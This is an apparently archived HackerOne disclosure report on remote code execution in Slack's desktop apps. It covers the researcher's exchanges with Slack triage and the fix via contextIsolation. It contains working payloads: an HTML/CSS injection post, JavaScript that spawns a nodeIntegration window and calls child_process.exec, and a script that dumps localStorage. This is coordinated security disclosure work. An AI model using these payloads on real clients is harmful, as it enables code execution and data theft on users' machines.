---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2020-08-28
submitted: 2020-01-27T00:05:37.110Z
bounty_usd: null
votes: 509
cve: []
program: "[[programs/slack|Slack]]"
reporter: "oskarsv"
source: "https://hackerone.com/reports/783877"
title: "Remote Code Execution in Slack desktop apps + bonus"
---
# Remote Code Execution in Slack desktop apps + bonus

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 509 | **Program:** Slack | **Disclosed:** 2020-08-28

- Report: [https://hackerone.com/reports/783877](https://hackerone.com/reports/783877)
- CWE: Code Injection
- Submitted: 2020-01-27T00:05:37.110Z

## Timeline

- **Report Filed**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **2020-01-28** @oskarsv: RCE JSON Post with supplemental CSS injection:
```
{
  "full": "asd",
  "preview": "
  	<svg>
		<style>#slack-img {
			position: fixed !important;
			z-index: 999999 !important;
			opacity: 0.5 !important;
			margin-top: -5000px;
			left: 0;
		}
		</style>
	</svg>
<img id=\"slack-img\" src=\"https://files.slack.com/files-tmb/T02AVL3AF-FTAAY9170-4102b468c8/screenshot_2020-01-28_at_23.22.48_360.png\" width=\"10000\" height=\"10000\" usemap=\"#slack-map\"><map name=\"slack-map\"><area shape=\"rect\" coords=\"10000,10000 0,0\" href=\"https://files.slack.com/files-pri/T02AVL3AF-FSVB2MXH8/re__html\" target=\"_self\"></map>"
}
```

`<style> CSS HERE </style>` in tags `<svg></svg>` does not get filtered out and is applied to the whole page. Therefore it's easy to setup a Post with own CSS and a huge clickable area which could be completely transparent or the opposite. 

[Previously reported](https://hackerone.com/reports/679969) keylogging might also be applicable.

{F699050}
- **2020-01-29** @bugtriage-sophia: Thank you for your report @oskarsv 

We're looking into this, and we'll keep you updated when we have additional information.
- **Report Triaged**
- **2020-02-06** @oskarsv: Hi

Any comments, updates?

RCE part works in latest 4.3.3 (macOS)
- **2020-02-10** @bugtriage-josh: Hey @oskarsv - The team is still working on this, thanks for your patience!
- **Bounty Awarded**
- **Bounty Awarded**
- **2020-02-25** @oskarsv: thank you
- **2020-02-25** @oskarsv: btw would you be interested in general code execution exploits, i.e. without the XSS part?
- **2020-02-25** @bugtriage-josh: If you find any others @oskarsv, yes, please feel free to send them over. 

-Thanks
- **2020-03-04** @bugtriage-josh: Hi @oskarsv and @ivarsvids 

I believe a fix for this should now be in place for this issue as of 4.4.0.  Can you verify that that issue is correctly fixed on your end?
- **2020-03-05** @oskarsv: @bugtriage-josh 

verified:
1. 4.4.0-beta3 fixes the RCE part by enabling `contextIsolation` 
2. XSS via email in `files.slack.com` still works

Just to confirm my previous question - will you accept a RCE payload without HTML injection as a valid report? This would be the JS exploit part without the HTML/XSS trigger.
- **2020-03-05** @bugtriage-josh: Hi @oskarsv 

Thanks for the confirmation; I'll ping the team about the XSS piece.  To be clear, are you asking whether the program accepts a *potential* RCE without an exploitation mechanism?

Generally, our program requires that researchers provide significant evidence of exploitability in order to accept reports.  That said, for very severe issues like RCE, we may make exceptions on a case-by-case basis if there is reasonable likelihood that it could be exploited in the real world.

Please let me know if you have additional questions.
- **2020-03-05** @oskarsv: @bugtriage-josh

Thanks.

It's would be a working exploit without the first trigger (xss/html injection) 

like in this report, the following is the code execution payload, the HTML/JS injection in Posts is the trigger
```
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}})
  nbw.loadURL('about:blank')
  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")')
```

It would be of course completely different. Working in 4.4.0 (bypassing `contextIsolation`) and older 4.x versions. 

Regarding reasonable likelihood, all you would need is any XSS reachable anywhere in the app.. tbh at the moment it's just not worth my time to look for XSS here and I don't want to gamble with reputation for nothing
- **2020-03-23** @bugtriage-sophia: Hey @oskarsv

Thank you for your patience and we apologize the delay.  Since the RCE portion of the report is fixed, we'll go ahead and mark this report as Resolved. Would you mind opening a second report for the XSS via Email issue you mentioned is still working?  We'll treat that one as a separate issue.  

On that front, we're actually having some trouble reproducing the email XSS attack you described and could use a little clarification there. Can you take a look at our below steps to reproduce and let us know if we're missing something or if there is something we're doing incorrectly?  Feel free to quote this reply and our steps in the new ticket.


1. Find a Slack account's forwarding email. F757995 F757993
2. Using Gmail, send a _plain text_ Email that contains a Javascript payload in HTML Code. (See below **HTML JavaScript Payload**)
3. Share this Email in a channel (Example of preview F757991)
4. Click on the shared Slack POST's "Open in new window" option and note you do not trigger XSS.  (Redirects users to `[team].slack.com` F757997 )
5. Click on the shared Slack POST's "Open Original" option and note you do not trigger XSS. (Redirects users to `files.slack.com`F757994 )

**HTML JavaScript Payload**
```
<html>
<body>
<script> 
window.desktop.delegate = {} 
window.desktop.delegate.canOpenURLInWindow = () => true 
window.desktop.window = {} 
window.desktop.window.open = () => 1 bw = window.open('about:blank') 
nbw = new bw.constructor({show: false}) 
nbw.loadURL('https://app.slack.com/robots.txt') 
nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))') 
</script>
</body>
</html>
```
- **Report Resolved**
- **2020-03-23** @oskarsv: Thank you @bugtriage-josh. Do you mind looking at the new RCE I reported as well - [#816156](https://hackerone.com/reports/816156)? 

@bugtriage-sophia I created a new report [#827606](https://hackerone.com/reports/827606) with a video demonstration, not sure what you're doing wrong and we can continue there. I mean, only besides the payload you provided here. It wouldn't work outside the Slack application and in this report was intended as a way to store JavaScript within Slack infrastructure with no external server requirements.
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **2020-07-15** @oskarsv: Hi @bugtriage-josh

Could you please give any reason for the postponement? It's been quite a while since the initial report, more than 6 months already.
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **2020-08-26** @oskarsv: hi @brandenjordan @bugtriage-josh 

wow. Slack has already published this exploit **without referencing me or either of my RCE writeups** at [https://slack.engineering/the-app-sandbox/](https://slack.engineering/the-app-sandbox/) 

That seems backhanded and unfair. Can we go for disclosure?
- **Agreed On Going Public**
- **2020-08-26** @lryder: Hi @oskarsv - My name is Larkin Ryder and I am currently serving as the interim Chief Security Officer here at Slack. @brandenjordan made me aware of this misstep and I am writing to convey very sincere apologies for any oversight in crediting your work. We very much appreciate the time and effort you've invested in making Slack safer. While the security team didn't author this blog post and the author has no visibility to your work in H1, we should make the extra steps to ensure all who contributed to improvement efforts in this area are recognized. I will investigate making appropriate updates to our blog post. Brandon will followup to ensure those updates are to your satisfaction and to coordinate your disclosure request. Again, I am very sorry for any misstep on our part. Thank you, Larkin
- **2020-08-27** @brandenjordan: @oskarsv quick follow up here.  

Can you provide as much info as possible on your method of disclosure?  Are you planning on a blog post?  If so, where specifically?  This information will help Slack prepare for any resulting inquiries.

Best,
Branden
- **2020-08-27** @oskarsv: This report as 'public'. 

I do not plan on writing a separate blog post, I think the report here + first comment are entirely sufficient. I will probably promote the H1 link on my private Twitter and Linkedin profiles and present the vulnerabilities internally at Evolution Gaming. Slack already wrote a blog post anyway:(.

FYI I replied to your yesterday's inquiry via `@wearehackerone.com` email, I hope you received it - I don't think it's possible to reply to support messages otherwise. 

thanks
- **2020-08-28** @brandenjordan: @oskarsv appreciate the details above and your partnership here!  On the topic of timing, will noon Pacific Time work for you for disclosure?  That will ensure we have folks ready on the Slack side in case of any press or customer inquiries.
- **2020-08-28** @brandenjordan: Quick follow up on the above. To be clear I was referring to 12ps Pacific today.
- **2020-08-28** @oskarsv: yes, that works for me. thank you for the quick resolution
- **Agreed On Going Public**
- **Report Became Public**
- **2020-08-30** @brandenjordan: @oskarsv, a quick follow up here. In case you haven't seen it, the Slack engineering blog post at https://slack.engineering/the-app-sandbox/ has been updated to call out your contributions here.

"We’d like to thank the researchers who contributed bug reports nudging us in this direction: particularly Oskars Vegeris and Matt Austin."
